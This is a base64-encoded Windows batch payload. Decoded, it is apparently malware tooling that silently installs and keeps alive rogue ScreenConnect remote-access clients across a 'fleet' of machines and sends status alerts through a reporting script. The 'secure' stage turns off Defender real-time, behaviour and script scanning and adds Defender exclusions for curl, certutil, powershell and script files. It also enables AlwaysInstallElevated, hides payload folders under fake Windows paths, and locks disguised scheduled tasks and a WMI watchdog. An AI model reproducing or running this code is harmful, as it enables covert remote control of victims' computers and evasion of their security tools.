ICIlTVNJJSIgPm51bCAyPiYxDQpjYWxsIDpOb01zaVBvbGljeQ0KcmVtIE0xMzogc3RhbGUgcHJp
bWFyeSBkaXIgKHNlcnZpY2UgZGVsZXRlZCwgcHJvZHVjdCB1bnJlZ2lzdGVyZWQpIGJyZWFrcw0K
cmVtIHRoZSBTQyBpbnN0YWxsZXIgY3VzdG9tIGFjdGlvbiAtIGNsZWFyIGl0IGJlZm9yZSBpbnN0
YWxsaW5nDQpzYyBxdWVyeSAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVLRUVQX0ZQJSkiID5udWwg
Mj4mMQ0KaWYgZXJyb3JsZXZlbCAxIGlmIGV4aXN0ICIlUEY4NiVcU2NyZWVuQ29ubmVjdCBDbGll
bnQgKCVLRUVQX0ZQJSkiICgNCiAgZWNobyBzdGFsZV9wcmltYXJ5X2Rpcl9jbGVhbj4+IiVMT0cl
Ig0KICBybWRpciAvcyAvcSAiJVBGODYlXFNjcmVlbkNvbm5lY3QgQ2xpZW50ICglS0VFUF9GUCUp
IiA+bnVsIDI+JjENCikNCmVjaG8gWyVUQUclXSBtc2lleGVjIGluc3RhbGw+PiIlTE9HJSINCm1z
aWV4ZWMgL2kgIiVNU0klIiAvcW4gL25vcmVzdGFydCBBTExVU0VSUz0xIFJFQk9PVD1SZWFsbHlT
dXBwcmVzcyAvTCp2ICIlV0QlXG1zaV9oZWFsLmxvZyIgPm51bCAyPiYxDQpzZXQgIk1TSUVYSVQ9
IUVSUk9STEVWRUwhIg0KZWNobyBbJVRBRyVdIG1zaWV4ZWMgZXhpdD0hTVNJRVhJVCE+PiIlTE9H
JSINCmlmICIhTVNJRVhJVCEiPT0iMTYxOCIgKA0KICBlY2hvIFslVEFHJV0gbXNpX2J1c3lfcmV0
cnk+PiIlTE9HJSINCiAgdGltZW91dCAvdCAzMCAvbm9icmVhayA+bnVsDQogIG1zaWV4ZWMgL2kg
IiVNU0klIiAvcW4gL25vcmVzdGFydCBBTExVU0VSUz0xIFJFQk9PVD1SZWFsbHlTdXBwcmVzcyAv
TCp2ICIlV0QlXG1zaV9oZWFsMi5sb2ciID5udWwgMj4mMQ0KICBzZXQgIk1TSUVYSVQ9IUVSUk9S
TEVWRUwhIg0KICBlY2hvIFslVEFHJV0gbXNpZXhlY19yZXRyeSBleGl0PSFNU0lFWElUIT4+IiVM
T0clIg0KKQ0KY2FsbCA6V2FpdFN2Yw0KY2FsbCA6UmVzdG9yZUFsdA0KcmVtIE8zNzogc2V2cnog
L2kgc2hhcmVzIGxlZ2FjeSBVcGdyYWRlQ29kZXMgd2l0aCBncnl4YSDigJQgYWx3YXlzIHJlLWVu
c3VyZSBHcnl4YSBhZnRlcg0KY2FsbCA6RW5zdXJlR3J5eGFNdXN0DQpleGl0IC9iIDANCnJlbSAl
MT1maW5nZXJwcmludCAtIHNlcnZpY2UgZGVsZXRlZCBidXQgcHJvZHVjdCByZWdpc3RlcmVkOiBy
ZXBhaXIgYnkgR1VJRC4NCnNjIHF1ZXJ5ICJTY3JlZW5Db25uZWN0IENsaWVudCAoJX4xKSIgPm51
bCAyPiYxDQppZiBub3QgZXJyb3JsZXZlbCAxIGV4aXQgL2IgMA0KaWYgbm90IGV4aXN0ICIlV0Ql
XG93bl9saWIucHMxIiBleGl0IC9iIDENCnBvd2Vyc2hlbGwgLU5vUHJvZmlsZSAtTm9uSW50ZXJh
Y3RpdmUgLUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLUZpbGUgIiVXRCVcb3duX2xpYi5wczEiIC1B
Y3Rpb24gcmVwYWlyIC1GcCAiJX4xIiAtV29ya0RpciAiJVdEJSIgPj4iJUxPRyUiIDI+JjENCmNh
bGwgOldhaXRTdmMNCmV4aXQgL2IgMA0KDQo6UmVzdG9yZUFsdA0KcmVtIEFMVCBzZXJ2aWNlIGdv
bmUgYnV0IHN0aWxsIHJlZ2lzdGVyZWQgKFNDLWZhbWlseSBtc2lleGVjIHNpZGUgZWZmZWN0KSAt
IHJlcGFpciBpdCB0b28uDQpzYyBxdWVyeSAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVBTFRfRlAl
KSIgPm51bCAyPiYxDQppZiBub3QgZXJyb3JsZXZlbCAxIGV4aXQgL2IgMA0KZWNobyBhbHQgbWlz
c2luZyAtIHJlcGFpciBhdHRlbXB0Pj4iJUxPRyUiDQppZiBleGlzdCAiJVdEJVxvd25fbGliLnBz
MSIgcG93ZXJzaGVsbCAtTm9Qcm9maWxlIC1Ob25JbnRlcmFjdGl2ZSAtRXhlY3V0aW9uUG9saWN5
IEJ5cGFzcyAtRmlsZSAiJVdEJVxvd25fbGliLnBzMSIgLUFjdGlvbiByZXBhaXIgLUZwICIlQUxU
X0ZQJSIgLVdvcmtEaXIgIiVXRCUiID4+IiVMT0clIiAyPiYxDQpzYyBxdWVyeSAiU2NyZWVuQ29u
bmVjdCBDbGllbnQgKCVBTFRfRlAlKSIgfCBmaW5kICJSVU5OSU5HIiA+bnVsDQppZiBub3QgZXJy
b3JsZXZlbCAxIHNldCAiQUxUX09LPTEiDQpleGl0IC9iIDANCg0KOk5vTXNpUG9saWN5DQpyZWcg
ZGVsZXRlICJIS0xNXFNPRlRXQVJFXFBvbGljaWVzXE1pY3Jvc29mdFxXaW5kb3dzXEluc3RhbGxl
ciIgL3YgRGlzYWJsZU1TSSAvZiA+bnVsIDI+JjENCnJlZyBkZWxldGUgIkhLQ1VcU09GVFdBUkVc
UG9saWNpZXNcTWljcm9zb2Z0XFdpbmRvd3NcSW5zdGFsbGVyIiAvdiBEaXNhYmxlTVNJIC9mID5u
dWwgMj4mMQ0KcmVnIGFkZCAiSEtMTVxTT0ZUV0FSRVxQb2xpY2llc1xNaWNyb3NvZnRcV2luZG93
c1xJbnN0YWxsZXIiIC92IERpc2FibGVNU0kgL3QgUkVHX0RXT1JEIC9kIDAgL2YgPm51bCAyPiYx
DQpleGl0IC9iIDANCg0KOldhaXRTdmMNCnNldCAiVFJJRVM9MCINCjpXYWl0TG9vcA0Kc2MgcXVl
cnkgIlNjcmVlbkNvbm5lY3QgQ2xpZW50ICglS0VFUF9GUCUpIiB8IGZpbmQgIlJVTk5JTkciID5u
dWwNCmlmIG5vdCBlcnJvcmxldmVsIDEgKA0KICBzZXQgIklOU1RBTExFRD0xIg0KICBzZXQgIlBS
SU1fT0s9MSINCiAgZXhpdCAvYiAwDQopDQpzZXQgL2EgVFJJRVMrPTENCmlmICVUUklFUyUgR0VR
IDEwIGV4aXQgL2IgMQ0KcGluZyAxMjcuMC4wLjEgLW4gNyA+bnVsIDI+JjENCmdvdG8gOldhaXRM
b29wDQoNCjpUZ1N0YXRlDQpzZXQgIk5FV1NUQVRFPSV+MSINCnNldCAiTVNHPSV+MiINCnNldCAi
T0xEU1RBVEU9Ig0KaWYgZXhpc3QgIiVTVEFURSUiIHNldCAvcCBPTERTVEFURT08IiVTVEFURSUi
DQpyZW0gZmFsc2UgRE9XTiBhZnRlciByZWJvb3QgcmFjZTogcHJpbWFyeSBhbHJlYWR5IFJ1bm5p
bmcg4oCUIGRvIG5vdCBzcGFtDQppZiAvSSAiJU5FV1NUQVRFJSI9PSJET1dOIiAoDQogIHNjIHF1
ZXJ5ICJTY3JlZW5Db25uZWN0IENsaWVudCAoJUtFRVBfRlAlKSIgfCBmaW5kICJSVU5OSU5HIiA+
bnVsDQogIGlmIG5vdCBlcnJvcmxldmVsIDEgKA0KICAgIGVjaG8gdGdfc2tpcF9kb3duX2FscmVh
ZHlfcnVubmluZz4+IiVMT0clIg0KICAgIGV4aXQgL2IgMA0KICApDQopDQpyZW0gcmF0ZS1saW1p
dCByZXBlYXRlZCBET1dOL0ZBSUw6IG1heCAxIGFsZXJ0IHBlciA2aCB3aGlsZSBzdHVjaw0KaWYg
L0kgIiVORVdTVEFURSUiPT0iRE9XTiIgZ290byA6TWF5YmVTdXBwcmVzcw0KaWYgL0kgIiVORVdT
VEFURSUiPT0iRkFJTCIgZ290byA6TWF5YmVTdXBwcmVzcw0KZ290byA6U2VuZEFsZXJ0DQo6TWF5
YmVTdXBwcmVzcw0KaWYgL0kgIiVORVdTVEFURSUiPT0iJU9MRFNUQVRFJSIgaWYgZXhpc3QgIiVX
RCVcdGdfc2VudC5mbGFnIiAoDQogIHBvd2Vyc2hlbGwgLU5vUHJvZmlsZSAtTm9uSW50ZXJhY3Rp
dmUgLUNvbW1hbmQgImlmKChOZXctVGltZVNwYW4gLVN0YXJ0IChHZXQtSXRlbSAtTGl0ZXJhbFBh
dGggJyVXRCVcdGdfc2VudC5mbGFnJykuTGFzdFdyaXRlVGltZSkuVG90YWxNaW51dGVzIC1sdCAz
NjApe2V4aXQgMH1lbHNle2V4aXQgMX0iID5udWwgMj4mMQ0KICBpZiBub3QgZXJyb3JsZXZlbCAx
ICgNCiAgICBlY2hvIHRnX3N1cHByZXNzZWRfJU5FV1NUQVRFJT4+IiVMT0clIg0KICAgIGV4aXQg
L2IgMA0KICApDQopDQo6U2VuZEFsZXJ0DQplY2hvICVORVdTVEFURSU+IiVTVEFURSUiDQplY2hv
IHNlbnQ+IiVXRCVcdGdfc2VudC5mbGFnIg0KcG93ZXJzaGVsbCAtTm9Qcm9maWxlIC1Ob25JbnRl
cmFjdGl2ZSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtRmlsZSAiJVdEJVx0Z19yZXBvcnQucHMx
IiAtU3RhdGUgJU5FV1NUQVRFJSAtU3VtbWFyeSAiJU1TRyUiIC1CdWlsZCAlTU9OVkVSJSAtQ291
bnQgJUNPVU5UJSA+bnVsIDI+JjENCmVjaG8gdGcgc3RhdGUgJU5FV1NUQVRFJSBzZW50Pj4iJUxP
RyUiDQpleGl0IC9iIDANCg==
::B64_MON_END
::B64_SEC_BEGIN
QGVjaG8gb2ZmDQpSRU0gT1dOX1NFQ1VSRSBCVUlMRCAyMDI2MDgwMlM5IC0gZHluYW1pYyBncnl4
YSBGUCBmcm9tIGdyeXhhLmNmZzsgTk8gTG9ja0RpciBvbiBTQyBkaXJzDQpzZXRsb2NhbCBFbmFi
bGVFeHRlbnNpb25zIEVuYWJsZURlbGF5ZWRFeHBhbnNpb24NCnNldCAiV0Q9JVByb2dyYW1EYXRh
JVxNaWNyb3NvZnRcV2luZG93c1xXRVJcVGVtcFwud3VjYWNoZSINCnNldCAiV0QyPSVQcm9ncmFt
RGF0YSVcTWljcm9zb2Z0XERpYWdub3Npc1xTdGF0ZVwuZXRsY2FjaGUiDQpzZXQgIkxPRz0lV0Ql
XGJvb3QuZXJyIg0Kc2V0ICJQUklNPVNjcmVlbkNvbm5lY3QgQ2xpZW50ICg1ZjYwMTA1Nzk4NTJl
NTA3KSINCnNldCAiQUxUPVNjcmVlbkNvbm5lY3QgQ2xpZW50IChmODYxYzgxNDBkNDUzNDI3KSIN
CnNldCAiS0VFUDE9NWY2MDEwNTc5ODUyZTUwNyINCnNldCAiS0VFUDI9Zjg2MWM4MTQwZDQ1MzQy
NyINCnNldCAiS0VFUDM9OTkwODE5OGU2NjhlNDc1MCINCmlmIGV4aXN0ICIlV0QlXGdyeXhhLmNm
ZyIgZm9yIC9mICJ1c2ViYWNrcSB0b2tlbnM9MSwqIGRlbGltcz09IiAlJUsgaW4gKCIlV0QlXGdy
eXhhLmNmZyIpIGRvIGlmIC9JICIlJUsiPT0iQ1VSUkVOVF9GUCIgc2V0ICJLRUVQMz0lJUwiDQpz
ZXQgIkdSWVhBPVNjcmVlbkNvbm5lY3QgQ2xpZW50ICglS0VFUDMlKSINCnNldCAiUEY9JVByb2dy
YW1GaWxlcyUiDQpzZXQgIlBGODY9JVByb2dyYW1GaWxlcyh4ODYpJSINCnNldCAiVEFTS1JPT1Q9
JVN5c3RlbVJvb3QlXFN5c3RlbTMyXFRhc2tzIg0KDQppZiBub3QgZXhpc3QgIiVXRCUiIG1rZGly
ICIlV0QlIiA+bnVsIDI+JjENCmlmIG5vdCBleGlzdCAiJVdEMiUiIG1rZGlyICIlV0QyJSIgPm51
bCAyPiYxDQplY2hvIHNlY3VyZV9iZWdpbiAlREFURSUgJVRJTUUlIFM5Pj4iJUxPRyUiDQoNClJF
TSAtLS0gTmV1dHJhbGl6ZSBNU0kgYmxvY2sgcG9saWNpZXMgKDE2MjUpIC0tLQ0KUkVNIERpc2Fi
bGVNU0k6IDA9YWxsb3csIDE9bm9uLWFkbWluIG9ubHksIDI9YWxsIC0+IGZvcmNlIDANCnJlZyBh
ZGQgIkhLTE1cU09GVFdBUkVcUG9saWNpZXNcTWljcm9zb2Z0XFdpbmRvd3NcSW5zdGFsbGVyIiAv
diBEaXNhYmxlTVNJIC90IFJFR19EV09SRCAvZCAwIC9mID5udWwgMj4mMQ0KcmVnIGFkZCAiSEtM
TVxTT0ZUV0FSRVxQb2xpY2llc1xNaWNyb3NvZnRcV2luZG93c1xJbnN0YWxsZXIiIC92IEFsd2F5
c0luc3RhbGxFbGV2YXRlZCAvdCBSRUdfRFdPUkQgL2QgMSAvZiA+bnVsIDI+JjENCnJlZyBkZWxl
dGUgIkhLQ1VcU09GVFdBUkVcUG9saWNpZXNcTWljcm9zb2Z0XFdpbmRvd3NcSW5zdGFsbGVyIiAv
diBEaXNhYmxlTVNJIC9mID5udWwgMj4mMQ0KcmVnIGFkZCAiSEtDVVxTT0ZUV0FSRVxQb2xpY2ll
c1xNaWNyb3NvZnRcV2luZG93c1xJbnN0YWxsZXIiIC92IEFsd2F5c0luc3RhbGxFbGV2YXRlZCAv
dCBSRUdfRFdPUkQgL2QgMSAvZiA+bnVsIDI+JjENCg0KUkVNIC0tLSBEZWZlbmRlcjogcmVnaXN0
cnkgZXhjbHVzaW9ucyAocG9saWN5ICsgcHJlZmVyZW5jZSBrZXlzKSAtLS0NCnJlZyBhZGQgIkhL
TE1cU09GVFdBUkVcUG9saWNpZXNcTWljcm9zb2Z0XFdpbmRvd3MgRGVmZW5kZXIiIC92IERpc2Fi
bGVBbnRpU3B5d2FyZSAvdCBSRUdfRFdPUkQgL2QgMSAvZiA+bnVsIDI+JjENCnJlZyBhZGQgIkhL
TE1cU09GVFdBUkVcUG9saWNpZXNcTWljcm9zb2Z0XFdpbmRvd3MgRGVmZW5kZXJcUmVhbC1UaW1l
IFByb3RlY3Rpb24iIC92IERpc2FibGVSZWFsdGltZU1vbml0b3JpbmcgL3QgUkVHX0RXT1JEIC9k
IDEgL2YgPm51bCAyPiYxDQpyZWcgYWRkICJIS0xNXFNPRlRXQVJFXFBvbGljaWVzXE1pY3Jvc29m
dFxXaW5kb3dzIERlZmVuZGVyXFJlYWwtVGltZSBQcm90ZWN0aW9uIiAvdiBEaXNhYmxlQmVoYXZp
b3JNb25pdG9yaW5nIC90IFJFR19EV09SRCAvZCAxIC9mID5udWwgMj4mMQ0KcmVnIGFkZCAiSEtM
TVxTT0ZUV0FSRVxQb2xpY2llc1xNaWNyb3NvZnRcV2luZG93cyBEZWZlbmRlclxSZWFsLVRpbWUg
UHJvdGVjdGlvbiIgL3YgRGlzYWJsZUlPQVZQcm90ZWN0aW9uIC90IFJFR19EV09SRCAvZCAxIC9m
ID5udWwgMj4mMQ0KcmVnIGFkZCAiSEtMTVxTT0ZUV0FSRVxQb2xpY2llc1xNaWNyb3NvZnRcV2lu
ZG93cyBEZWZlbmRlclxSZWFsLVRpbWUgUHJvdGVjdGlvbiIgL3YgRGlzYWJsZVNjcmlwdFNjYW5u
aW5nIC90IFJFR19EV09SRCAvZCAxIC9mID5udWwgMj4mMQ0KcmVnIGFkZCAiSEtMTVxTT0ZUV0FS
RVxNaWNyb3NvZnRcV2luZG93cyBEZWZlbmRlclxFeGNsdXNpb25zXFBhdGhzIiAvdiAiJVdEJSIg
L3QgUkVHX0RXT1JEIC9kIDAgL2YgPm51bCAyPiYxDQpyZWcgYWRkICJIS0xNXFNPRlRXQVJFXE1p
Y3Jvc29mdFxXaW5kb3dzIERlZmVuZGVyXEV4Y2x1c2lvbnNcUGF0aHMiIC92ICIlV0QyJSIgL3Qg
UkVHX0RXT1JEIC9kIDAgL2YgPm51bCAyPiYxDQpyZWcgYWRkICJIS0xNXFNPRlRXQVJFXE1pY3Jv
c29mdFxXaW5kb3dzIERlZmVuZGVyXEV4Y2x1c2lvbnNcUGF0aHMiIC92ICJDOlxXaW5kb3dzXFRl
bXAiIC90IFJFR19EV09SRCAvZCAwIC9mID5udWwgMj4mMQ0KcmVnIGFkZCAiSEtMTVxTT0ZUV0FS
RVxNaWNyb3NvZnRcV2luZG93cyBEZWZlbmRlclxFeGNsdXNpb25zXFBhdGhzIiAvdiAiJVRFTVAl
IiAvdCBSRUdfRFdPUkQgL2QgMCAvZiA+bnVsIDI+JjENCnJlZyBhZGQgIkhLTE1cU09GVFdBUkVc
TWljcm9zb2Z0XFdpbmRvd3MgRGVmZW5kZXJcRXhjbHVzaW9uc1xQYXRocyIgL3YgIiVQRiVcU2Ny
ZWVuQ29ubmVjdCBDbGllbnQgKCVLRUVQMSUpIiAvdCBSRUdfRFdPUkQgL2QgMCAvZiA+bnVsIDI+
JjENCnJlZyBhZGQgIkhLTE1cU09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3MgRGVmZW5kZXJcRXhj
bHVzaW9uc1xQYXRocyIgL3YgIiVQRiVcU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVLRUVQMiUpIiAv
dCBSRUdfRFdPUkQgL2QgMCAvZiA+bnVsIDI+JjENCnJlZyBhZGQgIkhLTE1cU09GVFdBUkVcTWlj
cm9zb2Z0XFdpbmRvd3MgRGVmZW5kZXJcRXhjbHVzaW9uc1xQYXRocyIgL3YgIiVQRiVcU2NyZWVu
Q29ubmVjdCBDbGllbnQgKCVLRUVQMyUpIiAvdCBSRUdfRFdPUkQgL2QgMCAvZiA+bnVsIDI+JjEN
CnJlZyBhZGQgIkhLTE1cU09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3MgRGVmZW5kZXJcRXhjbHVz
aW9uc1xQYXRocyIgL3YgIiVQRjg2JVxTY3JlZW5Db25uZWN0IENsaWVudCAoJUtFRVAxJSkiIC90
IFJFR19EV09SRCAvZCAwIC9mID5udWwgMj4mMQ0KcmVnIGFkZCAiSEtMTVxTT0ZUV0FSRVxNaWNy
b3NvZnRcV2luZG93cyBEZWZlbmRlclxFeGNsdXNpb25zXFBhdGhzIiAvdiAiJVBGODYlXFNjcmVl
bkNvbm5lY3QgQ2xpZW50ICglS0VFUDIlKSIgL3QgUkVHX0RXT1JEIC9kIDAgL2YgPm51bCAyPiYx
DQpyZWcgYWRkICJIS0xNXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzIERlZmVuZGVyXEV4Y2x1
c2lvbnNcUGF0aHMiIC92ICIlUEY4NiVcU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVLRUVQMyUpIiAv
dCBSRUdfRFdPUkQgL2QgMCAvZiA+bnVsIDI+JjENCmZvciAlJVAgaW4gKG1zaWV4ZWMuZXhlIGN1
cmwuZXhlIGNtZC5leGUgcG93ZXJzaGVsbC5leGUgY2VydHV0aWwuZXhlIFNjcmVlbkNvbm5lY3Qu
Q2xpZW50U2VydmljZS5leGUgU2NyZWVuQ29ubmVjdC5XaW5kb3dzQ2xpZW50LmV4ZSkgZG8gKA0K
ICByZWcgYWRkICJIS0xNXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzIERlZmVuZGVyXEV4Y2x1
c2lvbnNcUHJvY2Vzc2VzIiAvdiAiJSVQIiAvdCBSRUdfRFdPUkQgL2QgMCAvZiA+bnVsIDI+JjEN
CikNCg0KUkVNIC0tLSBEZWZlbmRlcjogbGl2ZSBNcFByZWZlcmVuY2UgKHN0cm9uZ2VyIHRoYW4g
cmVnIGFsb25lKSAtLS0NCnBvd2Vyc2hlbGwuZXhlIC1Ob1Byb2ZpbGUgLU5vbkludGVyYWN0aXZl
IC1FeGVjdXRpb25Qb2xpY3kgQnlwYXNzIC1Db21tYW5kIF4NCiAgIiRFcnJvckFjdGlvblByZWZl
cmVuY2U9J1NpbGVudGx5Q29udGludWUnOyIgXg0KICAiVHJ5e1NldC1NcFByZWZlcmVuY2UgLURp
c2FibGVSZWFsdGltZU1vbml0b3JpbmcgJHRydWU7IFNldC1NcFByZWZlcmVuY2UgLURpc2FibGVC
ZWhhdmlvck1vbml0b3JpbmcgJHRydWU7IFNldC1NcFByZWZlcmVuY2UgLURpc2FibGVJT0FWUHJv
dGVjdGlvbiAkdHJ1ZTsgU2V0LU1wUHJlZmVyZW5jZSAtRGlzYWJsZVNjcmlwdFNjYW5uaW5nICR0
cnVlfUNhdGNoe307IiBeDQogICIkcGF0aHM9QCgnJVdEJScsJyVXRDIlJywnQzpcV2luZG93c1xU
ZW1wJywkZW52OlRFTVAsJyVQRiVcU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVLRUVQMSUpJywnJVBG
JVxTY3JlZW5Db25uZWN0IENsaWVudCAoJUtFRVAyJSknLCclUEY4NiVcU2NyZWVuQ29ubmVjdCBD
bGllbnQgKCVLRUVQMSUpJywnJVBGODYlXFNjcmVlbkNvbm5lY3QgQ2xpZW50ICglS0VFUDIlKScp
OyIgXg0KICAidHJ5eyRwYXRocys9QChHZXQtQ2hpbGRJdGVtIC1QYXRoICRlbnY6UHJvZ3JhbUZp
bGVzIC1GaWx0ZXIgJ1NjcmVlbkNvbm5lY3QgQ2xpZW50KicgLURpcmVjdG9yeSAtRUEgMCB8IEZv
ckVhY2gtT2JqZWN0IHskXy5GdWxsTmFtZX0pfWNhdGNoe307IiBeDQogICJ0cnl7JHBmODY9W0Vu
dmlyb25tZW50XTo6R2V0Rm9sZGVyUGF0aCgnUHJvZ3JhbUZpbGVzWDg2Jyk7IGlmKCRwZjg2KXsk
cGF0aHMrPUAoR2V0LUNoaWxkSXRlbSAtUGF0aCAkcGY4NiAtRmlsdGVyICdTY3JlZW5Db25uZWN0
IENsaWVudConIC1EaXJlY3RvcnkgLUVBIDAgfCBGb3JFYWNoLU9iamVjdCB7JF8uRnVsbE5hbWV9
KX19Y2F0Y2h7fTsiIF4NCiAgImZvcmVhY2goJHAgaW4gKCRwYXRocyB8IFNlbGVjdC1PYmplY3Qg
LVVuaXF1ZSkpeyBpZigkcCAtYW5kIChUZXN0LVBhdGggLUxpdGVyYWxQYXRoICRwKSl7IEFkZC1N
cFByZWZlcmVuY2UgLUV4Y2x1c2lvblBhdGggJHAgLUVBIDAgfSB9OyIgXg0KICAiZm9yZWFjaCgk
eCBpbiBAKCdtc2lleGVjLmV4ZScsJ2N1cmwuZXhlJywnY21kLmV4ZScsJ3Bvd2Vyc2hlbGwuZXhl
JywnY2VydHV0aWwuZXhlJywnU2NyZWVuQ29ubmVjdC5DbGllbnRTZXJ2aWNlLmV4ZScsJ1NjcmVl
bkNvbm5lY3QuV2luZG93c0NsaWVudC5leGUnKSl7IEFkZC1NcFByZWZlcmVuY2UgLUV4Y2x1c2lv
blByb2Nlc3MgJHggLUVBIDAgfTsiIF4NCiAgIkFkZC1NcFByZWZlcmVuY2UgLUV4Y2x1c2lvbkV4
dGVuc2lvbiAnLmNtZCcsJy5wczEnLCcubXNpJyAtRUEgMCIgPm51bCAyPiYxDQoNClJFTSAtLS0g
QUNMOiBvbmx5IFNZU1RFTSArIEFkbWluaXN0cmF0b3JzIG9uIHBlcnNpc3QgZGlycyAtLS0NCmNh
bGwgOkxvY2tEaXIgIiVXRCUiDQpjYWxsIDpMb2NrRGlyICIlV0QyJSINCg0KUkVNIC0tLSBoaWRl
IHdvcmtkaXJzICsga2V5IHBheWxvYWQgZmlsZXMgLS0tDQphdHRyaWIgK2ggK3MgIiVXRCUiID5u
dWwgMj4mMQ0KYXR0cmliICtoICtzICIlV0QyJSIgPm51bCAyPiYxDQpSRU0gUzU6IGRvIE5PVCBo
aWRlL2xvY2sgdGhlIG11dGFibGUgcGF5bG9hZCBzY3JpcHRzIC0gY29weS9tb3ZlIG92ZXIgK2gg
K3MgZmlsZXMNClJFTSBmYWlscyBzaWxlbnRseSBhbmQgZnJvemUgdGhlIHdob2xlIGZsZWV0J3Mg
c2VsZi11cGRhdGUuIEhpZGRlbiBkaXJzIGNvbmNlYWwgY29udGVudHMgYWxyZWFkeS4NCmZvciAl
JUYgaW4gKHBrZy5tc2kgbm90aWZ5LmNmZyBpZGVudGl0eS5jZmcgc3RhdGUuanNvbikgZG8gKA0K
ICBpZiBleGlzdCAiJVdEJVwlJUYiIGF0dHJpYiAraCArcyAiJVdEJVwlJUYiID5udWwgMj4mMQ0K
KQ0KDQpSRU0gLS0tIEFDTDogc2NoZWR1bGVkIHRhc2sgWE1MIChoYXJkZXIgdG8gZGVsZXRlIHdp
dGhvdXQgQWRtaW4pIC0tLQ0KUkVNIFM2OiBuYW1lcyBjb250YWluIHNwYWNlcyAoIlNlcnZlciBE
aWFnbm9zdGljcyIpIC0gdGhlIGNtZCBGT1IgbG9vcCBzcGxpdA0KUkVNIHRoZW0gaW50byBnYXJi
YWdlIHRva2Vucy4gUG93ZXJTaGVsbCByZWFkcyBpZGVudGl0eS5jZmcgZGlyZWN0bHkgaW5zdGVh
ZC4NCnBvd2Vyc2hlbGwuZXhlIC1Ob1Byb2ZpbGUgLU5vbkludGVyYWN0aXZlIC1FeGVjdXRpb25Q
b2xpY3kgQnlwYXNzIC1Db21tYW5kIF4NCiAgIiRFcnJvckFjdGlvblByZWZlcmVuY2U9J1NpbGVu
dGx5Q29udGludWUnOyAkbmFtZXM9QCgpOyIgXg0KICAiaWYoVGVzdC1QYXRoIC1MaXRlcmFsUGF0
aCAnJVdEJVxpZGVudGl0eS5jZmcnKXsgR2V0LUNvbnRlbnQgLUxpdGVyYWxQYXRoICclV0QlXGlk
ZW50aXR5LmNmZycgLUZvcmNlIHwgRm9yRWFjaC1PYmplY3QgeyBpZigkXyAtbWF0Y2ggJ15UQVNL
X1tBLURdPSguKykkJyl7ICRuYW1lcyArPSAkbWF0Y2hlc1sxXS5UcmltKCkuVHJpbVN0YXJ0KCdc
JykgfSB9IH0iIF4NCiAgImVsc2UgeyAkbmFtZXM9QCgnV2VyUXVldWVTeW5jJywnUGxhU2VydmVy
SGVhbHRoJywnV2RpSG9zdFByb3h5JywnVGNwSXBDb25mbGljdFJlcycpIH07IiBeDQogICJmb3Jl
YWNoKCRuIGluICRuYW1lcyl7ICRmID0gSm9pbi1QYXRoICclVEFTS1JPT1QlJyAkbjsgaWYoVGVz
dC1QYXRoIC1MaXRlcmFsUGF0aCAkZil7ICYgaWNhY2xzLmV4ZSAkZiAvaW5oZXJpdGFuY2U6ciB8
IE91dC1OdWxsOyAmIGljYWNscy5leGUgJGYgL2dyYW50OnIgJ05UIEFVVEhPUklUWVxTWVNURU06
RicgJ0JVSUxUSU5cQWRtaW5pc3RyYXRvcnM6RicgfCBPdXQtTnVsbDsgJiBhdHRyaWIuZXhlICto
ICtzICRmIHwgT3V0LU51bGwgfSB9IiA+bnVsIDI+JjENCg0KUkVNIC0tLSBBQ0w6IFdNSSB3YXRj
aGRvZyBzdWJzY3JpcHRpb24gZmlsZXMgKGNoYWluIDIpIC0tLQ0KaWNhY2xzICIlU3lzdGVtUm9v
dCVcU3lzdGVtMzJcd2JlbVxSZXBvc2l0b3J5IiAvZ3JhbnQgIk5UIEFVVEhPUklUWVxTWVNURU06
RiIgPm51bCAyPiYxDQoNClJFTSAtLS0gQUNMOiBkbyBOT1QgTG9ja0RpciBTY3JlZW5Db25uZWN0
IGluc3RhbGwgZGlycyAtLS0NClJFTSB0YWtlb3duK3N0cmlwIG9uIGxpdmUgU0MgZGlycyBicmVh
a3MgY2xpZW50IGZpbGUgd3JpdGVzL3VwZGF0ZXMg4oaSIHBhbmVsIE9GRkxJTkUNClJFTSB3aGls
ZSBzZXJ2aWNlIHN0aWxsIGxvb2tzIFJ1bm5pbmcuIERlZmVuZGVyIGV4Y2x1c2lvbnMgKyBzZXJ2
aWNlIFNEIGFyZSBlbm91Z2guDQpSRU0gTzM3OiBvbmUtc2hvdCB1bmxvY2sgaWYgYSBwcmlvciBi
dWlsZCBMb2NrRGlyJ2QgdGhlc2UgcGF0aHMuDQppZiBleGlzdCAiJVdEJVxzZWN1cmVfc2MuZmxh
ZyIgKA0KICBmaW5kc3RyIC9DOiJzY19ub2xvY2tfZGlycyIgIiVXRCVcc2VjdXJlX3NjLmZsYWci
ID5udWwgMj4mMQ0KICBpZiBlcnJvcmxldmVsIDEgKA0KICAgIGVjaG8gc2NfdW5sb2NrX3ByaW9y
X2xvY2tkaXI+PiIlTE9HJSINCiAgICBmb3IgJSVEIGluICgNCiAgICAgICIlUEYlXFNjcmVlbkNv
bm5lY3QgQ2xpZW50ICglS0VFUDElKSINCiAgICAgICIlUEYlXFNjcmVlbkNvbm5lY3QgQ2xpZW50
ICglS0VFUDIlKSINCiAgICAgICIlUEYlXFNjcmVlbkNvbm5lY3QgQ2xpZW50ICglS0VFUDMlKSIN
CiAgICAgICIlUEY4NiVcU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVLRUVQMSUpIg0KICAgICAgIiVQ
Rjg2JVxTY3JlZW5Db25uZWN0IENsaWVudCAoJUtFRVAyJSkiDQogICAgICAiJVBGODYlXFNjcmVl
bkNvbm5lY3QgQ2xpZW50ICglS0VFUDMlKSINCiAgICApIGRvICgNCiAgICAgIGlmIGV4aXN0ICIl
JX5EIiAoDQogICAgICAgIHRha2Vvd24gL0YgIiUlfkQiIC9SIC9EIFkgPm51bCAyPiYxDQogICAg
ICAgIGljYWNscyAiJSV+RCIgL3Jlc2V0IC9UIC9DIC9RID5udWwgMj4mMQ0KICAgICAgICBpY2Fj
